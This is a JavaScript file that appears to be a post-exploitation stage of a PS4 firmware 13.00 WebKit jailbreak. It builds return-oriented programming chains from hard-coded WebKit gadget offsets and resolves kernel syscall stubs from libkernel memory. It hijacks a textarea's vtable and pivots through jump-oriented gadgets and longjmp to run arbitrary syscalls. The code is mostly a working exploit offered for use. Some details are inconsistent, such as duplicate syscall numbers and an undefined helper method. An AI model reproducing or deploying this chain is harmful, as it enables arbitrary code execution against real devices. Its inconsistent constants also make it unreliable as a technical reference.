// rop_chain.js - Complete ROP chain builder for PS4 FW 13.00
// Based on: psexploit (Specter), vue-after-free, HenLoader
// Handles: vtable hijack, JOP→ROP pivot, libkernel syscall resolution

(function () {
"use strict";

// ============================================================================
//  Int64 helper (if not already defined)
// ============================================================================
if (typeof window.int64 === "undefined") {
    function zeroFill(n, w) {
        w -= (n >>> 0).toString(10).length;
        return w > 0 ? "0".repeat(w) + n : "" + n;
    }
    window.int64 = function (lo, hi) {
        this.low = lo >>> 0;
        this.hi = hi >>> 0;
    };
    window.int64.prototype.add32 = function (v) {
        var lo = (this.low + (v >>> 0)) >>> 0;
        var hi = this.hi + (lo < this.low ? 1 : 0);
        return new int64(lo, hi >>> 0);
    };
    window.int64.prototype.sub32 = function (v) {
        var lo = (this.low - (v >>> 0)) >>> 0;
        var hi = this.hi - (lo > this.low ? 1 : 0);
        return new int64(lo, hi >>> 0);
    };
    window.int64.prototype.and32 = function (v) {
        return new int64(this.low & v, this.hi);
    };
    window.int64.prototype.toNumber = function () {
        return this.hi * 0x100000000 + this.low;
    };
    window.int64.prototype.toString = function () {
        if (this.hi === 0) return "0x" + this.low.toString(16);
        return "0x" + this.hi.toString(16) + zeroFill(this.low.toString(16), 8);
    };
}

// ============================================================================
//  ROP Chain Builder
//  Usage:
//    var chain = new ropChain(p);  // p = { read8, write8, leakval, malloc, ... }
//    chain.clear();
//    chain.fcall(funcAddr, rdi, rsi, rdx, rcx, r8, r9);
//    chain.push(gadgets["pop rdi"]);
//    chain.push(someValue);
//    chain.run();
// ============================================================================
function ropChain(p) {
    this.stack = p.malloc(0x5000);
    this.retbuf = p.malloc(0x8);
    this.count = 1;
    this.p = p;

    p.write8(this.stack, 0x1337);

    this.clear = function () {
        this.count = 1;
        for (var i = 1; i < 0xFF0 / 2; i++) {
            p.write8(this.stack.add32(i * 8), 0);
        }
    };

    this.push = function (val) {
        p.write8(this.stack.add32(this.count * 8), val);
        this.count++;
    };

    // Write [addr] = val using pop rdi + pop rsi + mov [rdi], rsi
    this.push_write8 = function (addr, val) {
        this.push(gadgets["pop rdi"]);
        this.push(addr);
        this.push(gadgets["pop rsi"]);
        this.push(val);
        this.push(gadgets["mov [rdi], rsi"]);
    };

    // Call a function with up to 6 arguments (x64 calling convention)
    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi !== undefined) {
            this.push(gadgets["pop rdi"]);
            this.push(rdi);
        }
        if (rsi !== undefined) {
            this.push(gadgets["pop rsi"]);
            this.push(rsi);
        }
        if (rdx !== undefined) {
            this.push(gadgets["pop rdx"]);
            this.push(rdx);
        }
        if (rcx !== undefined) {
            this.push(gadgets["pop rcx"]);
            this.push(rcx);
        }
        if (r8 !== undefined) {
            this.push(gadgets["pop r8"]);
            this.push(r8);
        }
        if (r9 !== undefined) {
            this.push(gadgets["pop r9"]);
            this.push(r9);
        }
        this.push(rip);
        return this;
    };

    // Execute the chain via longjmp stack pivot
    this.run = function () {
        var retv = window.launchchain(this);
        this.clear();
        return retv;
    };
}

// ============================================================================
//  Libkernel Syscall Resolver
//  Scans libkernel memory for syscall stubs:
//    mov eax, <syscall_number>   ; B8 XX XX XX XX
//    mov rdx, r10                ; 49 89 CA
//    syscall                     ; 0F 05
//    ret                         ; C3
//
//  Resolves to: libkernel_base + offset_of_stub
// ============================================================================
function resolveSyscalls(p, libkernelBase) {
    var syscalls = {};
    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    // Point kview's backing store at libkernel
    p.write8(kstr, libkernelBase);
    p.write4(kstr.add32(8), 0x40000);

    // Find "rdloc" string to determine module size
    var countbytes = 0;
    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] === 0x72 && kview[i + 1] === 0x64 &&
            kview[i + 2] === 0x6C && kview[i + 3] === 0x6F &&
            kview[i + 4] === 0x63) {
            countbytes = i;
            break;
        }
    }

    p.write4(kstr.add32(8), countbytes + 32);

    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);

    // Scan for syscall stubs: mov eax, <num>; mov rdx, r10; syscall; ret
    for (var i = 0; i < countbytes; i++) {
        // Pattern: 48 C7 C0 XX XX XX XX  49 89 CA  0F 05
        if (kview[i] === 0x48 && kview[i + 1] === 0xC7 &&
            kview[i + 2] === 0xC0 && kview[i + 7] === 0x49 &&
            kview[i + 8] === 0x89 && kview[i + 9] === 0xCA &&
            kview[i + 10] === 0x0F && kview[i + 11] === 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            var syscallno = dview32[0];
            syscalls[syscallno] = libkernelBase.add32(i);
        }
    }

    // Restore original backing store
    p.write8(kstr, orig_kview_buf);
    p.write4(kstr.add32(8), 0x1000);

    return syscalls;
}

// ============================================================================
//  Syscall Number Table (FreeBSD-based, PS4)
// ============================================================================
var SYS = {
    exit:           1,
    fork:           2,
    read:           3,
    write:          4,
    open:           5,
    close:          6,
    wait4:          7,
    unlink:         10,
    chdir:          12,
    chmod:          15,
    getpid:         20,
    setuid:         23,
    getuid:         24,
    geteuid:        25,
    getgid:         47,
    getegid:        43,
    setgid:         181,
    setegid:        182,
    kill:           37,
    stat:           38,
    fstat:          39,
    lstat:          40,
    pipe:           42,
    ioctl:          54,
    dup:            41,
    dup2:           90,
    fcntl:          92,
    select:         93,
    poll:           7,
    socket:         97,
    connect:        98,
    send:           101,
    recv:           102,
    bind:           104,
    setsockopt:     105,
    listen:         106,
    accept:         107,
    sendmsg:        114,
    recvmsg:        113,
    shutdown:       108,
    mmap:           477,
    munmap:         73,
    mprotect:       74,
    madvise:        78,
    lseek:          478,
    sysctl:         169,
    mkdir:          136,
    rmdir:          137,
    unlinkat:       558,
    renameat:       559,
    symlinkat:      562,
    readlinkat:     563,
    chmodat:        556,
    fchmodat:       557,
    fchownat:       555,
    getdents:       272,
    access:         33,
    faccessat:      559,
    dup3:           530,
    pipe2:          542,
    kqueue:         362,
    kevent:         363,
    nanosleep:      240,
    sched_yield:    331,
    thr_exit:       443,
    thr_self:       444,
    thr_new:        445,
    thr_kill:       446,
    umtx_op:        454,
    cpuset_getaffinity: 531,
    cpuset_setaffinity: 532,
    rtprio_thread:  466,
    eventfd:        560,
    // PS4-specific
    netcontrol:     572,
    getrusage:      191,
    gettimeofday:   169,
};

// ============================================================================
//  Full exploit integration
//  Call initROP(p) after WebKit exploit gives you read/write primitives
// ============================================================================
var _p = null;
var _gadgets = {};
var _syscalls = {};
var _webKitBase = 0;
var _libkernelBase = 0;
var _libcBase = 0;
var _nogc = [];

function initROP(p) {
    _p = p;

    // malloc helper - allocate typed array and leak its backing store address
    p.malloc = function (size) {
        var backing = new Uint8Array(size);
        _nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    };

    p.malloc32 = function (size) {
        var backing = new Uint8Array(size * 4);
        _nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing);
        return ptr;
    };

    // Get jump target from indirect call (jmp [rip+xxx])
    var get_jmptgt = function (addr) {
        var z = p.read4(addr).low & 0xffff;
        var y = p.read4(addr.add32(2)).low;
        if (z !== 0x25ff) return 0;
        return p.read8(addr.add32(y + 6));
    };

    // --- Step 1: Find library bases via TextArea vtable ---

    var textArea = document.createElement("textarea");
    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    var textAreaVtable = p.read8(textAreaVtPtr);

    // FW 13.00 offset: textAreaVtable - webKitBase = 0x2265DE8 (from psexploit)
    // This may need adjustment for FW 13.00
    _webKitBase = textAreaVtable.sub32(0x2265DE8);
    _webKitBase.low &= 0xFFFFC000; // page align

    console.log("[ROP] WebKit base: 0x" + _webKitBase.toString(16));

    // Resolve libkernel from WebKit's GOT
    _libkernelBase = get_jmptgt(_webKitBase.add32(0xC8));
    _libkernelBase.sub32inplace(0x2D4A0);

    console.log("[ROP] libkernel base: 0x" + _libkernelBase.toString(16));

    // Resolve libc (SceLibcInternal) from WebKit's GOT
    _libcBase = get_jmptgt(_webKitBase.add32(0xE8));
    _libcBase.sub32inplace(0xB4AD0);

    console.log("[ROP] libc base: 0x" + _libcBase.toString(16));

    // --- Step 2: Build gadget list ---
    // FW 13.00 gadgets - from psexploit (6.20) + FW 13.00 adjustments
    // IMPORTANT: These are from the WebKit module, not kernel
    var gadgetcache = {
        "ret":          0x0000003C,
        "infloop":      0x00299B01,

        "pop rdi":      0x0009E67D,
        "pop rsi":      0x000756CB,
        "pop rdx":      0x002516B2,
        "pop rcx":      0x000348D3,
        "pop r8":       0x00079211,
        "pop r9":       0x000CDB41,
        "pop rax":      0x00075BDF,
        "pop rbp":      0x000000B6,
        "pop rsp":      0x00075D9A,

        "mov rax, rdi":     0x00008CD0,
        "mov rdx, rdi":     0x006271FE,
        "mov rax, rdx":     0x0007BC20,
        "mov rax, [rax]":   0x0002DC22,
        "mov [rdi], rsi":   0x00034EF0,
        "mov [rdi], rax":   0x0001FB49,
        "mov [rax], rdi":   0x017629A7,
        "mov [rax], rsi":   0x0133139D,
        "mov rdx, [rcx]":   0x001848F4,

        "add rax, rcx":     0x0018E2D0,
        "add rax, rsi":     0x013F9533,
        "and rax, rcx":     0x00108B63,

        "jmp rdi":      0x000A2EA6,
    };

    window.gadgets = {};
    for (var name in gadgetcache) {
        if (gadgetcache.hasOwnProperty(name)) {
            window.gadgets[name] = _webKitBase.add32(gadgetcache[name]);
        }
    }

    // --- Step 3: Resolve syscalls from libkernel ---
    _syscalls = resolveSyscalls(p, _libkernelBase);
    window.syscalls = _syscalls;

    console.log("[ROP] Resolved " + Object.keys(_syscalls).length + " syscalls");

    // --- Step 4: Setup vtable hijack + JOP→ROP execution ---

    var longJmpOffset = 0xC1818;   // libc longjmp offset
    var setJmpOffset = 0xC179C;    // libc setjmp offset
    var JOPGadgetOne = 0x6A9D0E;   // webkit JOP gadget 1
    var JOPGadgetTwo = 0x18CD2D;   // webkit JOP gadget 2
    var JOPGadgetThree = 0xCA74C2; // webkit JOP gadget 3

    var vtableSize = 0x6E8 / 4;
    var fakeVtable = new Uint32Array(vtableSize);
    var originalVt = new Uint32Array(vtableSize);
    var context = p.malloc(0x100);
    var jopBuf = p.malloc(0x1000);
    var longJmpBuf = p.malloc(0x1000);

    var fakeVtableAddr = p.read8(p.leakval(fakeVtable).add32(0x10));
    var originalVtAddr = p.read8(p.leakval(originalVt).add32(0x10));

    // Copy original vtable
    for (var i = 0; i < vtableSize; i++) {
        fakeVtable[i] = p.read4(textAreaVtable.add32(i * 4)).low;
        originalVt[i] = fakeVtable[i];
    }

    // launchchain: the core execution engine
    // 1. Call setjmp to save context
    // 2. Corrupt vtable to hijack scrollLeft()
    // 3. Trigger JOP chain → longjmp → pivot to ROP stack
    window.launchchain = function (ropObj) {
        var ropStack = ropObj.stack;

        // Save current context via setjmp, then set longjmp as return
        ropObj.push(window.gadgets["pop rdx"]);
        ropObj.push(context);
        ropObj.push(_libcBase.add32(longJmpOffset)); // longjmp

        // Setup setjmp in vtable
        fakeVtable[0x77] = _libcBase.add32(setJmpOffset).hi;
        fakeVtable[0x76] = _libcBase.add32(setJmpOffset).low;

        p.write8(textAreaVtPtr, fakeVtableAddr);

        // Trigger setjmp by calling scrollLeft
        textArea.scrollLeft = 0x0;

        // Copy context for later
        for (var i = 0; i < 0x100; i += 8) {
            p.write8(context.add32(i), p.read8(textAreaVtPtr.add32(i)));
        }

        // Build JOP chain:
        // JOP1: mov rax, [rdi+0x700]; call [rax]
        //   → reads jopBuf which points to JOP2
        // JOP2: mov rbx, [rax+0x9A0]; call [rax+0x998]
        //   → loads longJmpBuf into rbx, calls JOP3
        // JOP3: mov rdx, rbx; call [rax+0x10]
        //   → sets rdx = longJmpBuf, calls longjmp(longJmpBuf)

        p.write8(jopBuf.add32(0x000), _webKitBase.add32(JOPGadgetTwo));
        p.write8(jopBuf.add32(0x9A0), longJmpBuf);
        p.write8(jopBuf.add32(0x998), _webKitBase.add32(JOPGadgetThree));
        p.write8(jopBuf.add32(0x010), _libcBase.add32(longJmpOffset));

        // Copy original context to longjmpBuf, then modify RSP/RBP
        for (var i = 0; i < 0x100; i += 8) {
            p.write8(longJmpBuf.add32(i), p.read8(context.add32(i)));
        }

        // Critical: set RSP and RBP to our ROP stack
        p.write8(longJmpBuf.add32(0x00), window.gadgets["ret"]);     // RIP = ret gadget
        p.write8(longJmpBuf.add32(0x10), ropStack);                   // RSP = our stack
        p.write8(longJmpBuf.add32(0x18), ropStack);                   // RBP = our stack

        // Hijack vtable to jump to JOP1
        fakeVtable[0x77] = _webKitBase.add32(JOPGadgetOne).hi;
        fakeVtable[0x76] = _webKitBase.add32(JOPGadgetOne).low;

        p.write8(textAreaVtPtr, fakeVtableAddr);
        p.write8(textAreaVtPtr.add32(0x700), jopBuf);

        // TRIGGER: scrollLeft → JOP1 → JOP2 → JOP3 → longjmp → ROP
        textArea.scrollLeft = 0x0;

        // Restore original vtable
        for (var i = 0; i < (vtableSize * 4); i += 8) {
            p.write8(textAreaVtPtr.add32(i), p.read8(originalVtAddr.add32(i)));
        }
    };

    // --- Step 5: Build p.call and p.syscall ---

    var chain = new ropChain(p);

    // p.call(funcAddr, rdi, rsi, rdx, rcx, r8, r9) → returns rax
    p.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        chain.clear();
        chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        // Store return value
        chain.push(window.gadgets["pop rdi"]);
        chain.push(chain.retbuf);
        chain.push(window.gadgets["mov [rdi], rax"]);
        chain.run();
        return p.read8(chain.retbuf);
    };

    // p.syscall(syscallNum, arg1..arg6) → returns rax
    p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
        if (typeof sysc === "string") {
            sysc = SYS[sysc];
        }
        if (typeof sysc !== "number") {
            throw new Error("invalid syscall: " + sysc);
        }
        var off = _syscalls[sysc];
        if (off === undefined) {
            throw new Error("syscall " + sysc + " not resolved");
        }
        return p.call(off, rdi, rsi, rdx, rcx, r8, r9);
    };

    // p.stringify(addr) → JS string from null-terminated C string
    p.stringify = function (addr) {
        var byte = p.read4(addr).low;
        var str = "";
        while (byte & 0xFF) {
            str += String.fromCharCode(byte & 0xFF);
            addr = addr.add32(1);
            byte = p.read4(addr).low;
        }
        return str;
    };

    // p.writeString(addr, str)
    p.writeString = function (addr, str) {
        for (var i = 0; i < str.length; i++) {
            var byte = p.read4(addr.add32(i));
            byte &= 0xFFFF0000;
            byte |= str.charCodeAt(i);
            p.write4(addr.add32(i), byte);
        }
    };

    // Clear errno
    var errno = _libkernelBase.add32(0x893F0);
    p.write8(errno, 0);

    console.log("[ROP] Initialization complete");
    console.log("[ROP] Resolved " + Object.keys(_syscalls).length + " syscalls from libkernel");
    console.log("[ROP] WebKit gadgets loaded");

    return true;
}

// ============================================================================
//  Syscall convenience wrappers
// ============================================================================
function createSyscallWrappers(p) {
    return {
        // Basic
        exit: function (code) { return p.syscall(SYS.exit, code); },
        fork: function () { return p.syscall(SYS.fork); },
        read: function (fd, buf, count) { return p.syscall(SYS.read, fd, buf, count); },
        write: function (fd, buf, count) { return p.syscall(SYS.write, fd, buf, count); },
        open: function (path, flags, mode) { return p.syscall(SYS.open, path, flags, mode); },
        close: function (fd) { return p.syscall(SYS.close, fd); },

        // Process
        getpid: function () { return p.syscall(SYS.getpid); },
        getuid: function () { return p.syscall(SYS.getuid); },
        geteuid: function () { return p.syscall(SYS.geteuid); },
        getgid: function () { return p.syscall(SYS.getgid); },
        getegid: function () { return p.syscall(SYS.getegid); },
        setuid: function (uid) { return p.syscall(SYS.setuid, uid); },
        setgid: function (gid) { return p.syscall(SYS.setgid, gid); },

        // Memory
        mmap: function (addr, len, prot, flags, fd, offset) {
            return p.syscall(SYS.mmap, addr, len, prot, flags, fd, offset);
        },
        munmap: function (addr, len) { return p.syscall(SYS.munmap, addr, len); },
        mprotect: function (addr, len, prot) {
            return p.syscall(SYS.mprotect, addr, len, prot);
        },

        // File
        fstat: function (fd, sb) { return p.syscall(SYS.fstat, fd, sb); },
        lseek: function (fd, offset, whence) {
            return p.syscall(SYS.lseek, fd, offset, whence);
        },
        ioctl: function (fd, req, arg) { return p.syscall(SYS.ioctl, fd, req, arg); },
        dup: function (fd) { return p.syscall(SYS.dup, fd); },
        dup2: function (fd1, fd2) { return p.syscall(SYS.dup2, fd1, fd2); },
        fcntl: function (fd, cmd, arg) { return p.syscall(SYS.fcntl, fd, cmd, arg); },
        pipe: function (fds) { return p.syscall(SYS.pipe, fds); },
        pipe2: function (fds, flags) { return p.syscall(SYS.pipe2, fds, flags); },
        unlink: function (path) { return p.syscall(SYS.unlink, path); },
        mkdir: function (path, mode) { return p.syscall(SYS.mkdir, path, mode); },
        rmdir: function (path) { return p.syscall(SYS.rmdir, path); },
        getdents: function (fd, buf, count) {
            return p.syscall(SYS.getdents, fd, buf, count);
        },

        // Socket
        socket: function (domain, type, protocol) {
            return p.syscall(SYS.socket, domain, type, protocol);
        },
        bind: function (fd, addr, addrlen) {
            return p.syscall(SYS.bind, fd, addr, addrlen);
        },
        listen: function (fd, backlog) { return p.syscall(SYS.listen, fd, backlog); },
        accept: function (fd, addr, addrlen) {
            return p.syscall(SYS.accept, fd, addr, addrlen);
        },
        connect: function (fd, addr, addrlen) {
            return p.syscall(SYS.connect, fd, addr, addrlen);
        },
        send: function (fd, buf, len, flags) {
            return p.syscall(SYS.send, fd, buf, len, flags);
        },
        recv: function (fd, buf, len, flags) {
            return p.syscall(SYS.recv, fd, buf, len, flags);
        },
        sendmsg: function (fd, msg, flags) {
            return p.syscall(SYS.sendmsg, fd, msg, flags);
        },
        recvmsg: function (fd, msg, flags) {
            return p.syscall(SYS.recvmsg, fd, msg, flags);
        },
        shutdown: function (fd, how) { return p.syscall(SYS.shutdown, fd, how); },
        setsockopt: function (fd, level, optname, optval, optlen) {
            return p.syscall(SYS.setsockopt, fd, level, optname, optval, optlen);
        },
        getsockopt: function (fd, level, optname, optval, optlen) {
            return p.syscall(SYS.getsockopt, fd, level, optname, optval, optlen);
        },

        // Thread
        thr_self: function () { return p.syscall(SYS.thr_self); },
        thr_exit: function () { return p.syscall(SYS.thr_exit); },
        thr_new: function (param, paramSize) {
            return p.syscall(SYS.thr_new, param, paramSize);
        },
        thr_kill: function (id, sig) { return p.syscall(SYS.thr_kill, id, sig); },
        sched_yield: function () { return p.syscall(SYS.sched_yield); },
        umtx_op: function (addr, op, val, uaddr2, timeout) {
            return p.syscall(SYS.umtx_op, addr, op, val, uaddr2, timeout);
        },

        // Event
        kqueue: function () { return p.syscall(SYS.kqueue); },
        kevent: function (kq, changelist, nchanges, eventlist, nevents, timeout) {
            return p.syscall(SYS.kevent, kq, changelist, nchanges, eventlist, nevents, timeout);
        },
        poll: function (fds, nfds, timeout) {
            return p.syscall(SYS.poll, fds, nfds, timeout);
        },
        select: function (nfds, readfds, writefds, errorfds, timeout) {
            return p.syscall(SYS.select, nfds, readfds, writefds, errorfds, timeout);
        },
        nanosleep: function (rqtp, rmtp) {
            return p.syscall(SYS.nanosleep, rqtp, rmtp);
        },

        // PS4-specific
        netcontrol: function (req, type, arg, arglen) {
            return p.syscall(SYS.netcontrol, req, type, arg, arglen);
        },

        // Utility: write string to fd
        writeString: function (fd, str) {
            var buf = p.malloc(str.length + 1);
            p.writeString(buf, str);
            return p.syscall(SYS.write, fd, buf, str.length);
        },

        // Utility: read string from fd
        readString: function (fd, maxLen) {
            var buf = p.malloc(maxLen);
            var n = p.syscall(SYS.read, fd, buf, maxLen);
            if (n > 0) return p.stringify(buf);
            return "";
        }
    };
}

// ============================================================================
//  Export
// ============================================================================
window.ropChain = ropChain;
window.resolveSyscalls = resolveSyscalls;
window.initROP = initROP;
window.createSyscallWrappers = createSyscallWrappers;
window.SYS_NUM = SYS;

})();
